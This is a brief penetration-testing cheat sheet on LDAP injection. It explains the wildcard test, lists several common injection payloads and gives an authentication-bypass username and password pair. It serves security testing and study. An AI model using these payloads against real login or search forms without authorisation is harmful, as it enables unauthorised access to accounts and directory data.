# <span style="color:#FF5555">LDAP Injection</span>

If an app builds LDAP queries/filters from your input (login forms, search fields, anything that ends up in an LDAP filter), test for injection.

> [!tip] Try the wildcard `*`
> The asterisk is the LDAP wildcard. Put `*` into any parameter whose value gets passed into an LDAP filter — if the response changes (e.g. a login succeeds, or a search returns everything), it's likely injectable.

### <span style="color:#50FA7B">Common payloads</span>
```text
*
*)(&
*)(uid=*))(|(uid=*
admin*
admin)(&)
*)(|(password=*))
```

### <span style="color:#50FA7B">Auth bypass example</span>
```text
Username: *)(uid=*))(|(uid=*
Password: *
```

Watch how the app responds to different inputs — differing behaviour/errors reveals whether the payload reaches an LDAP backend.
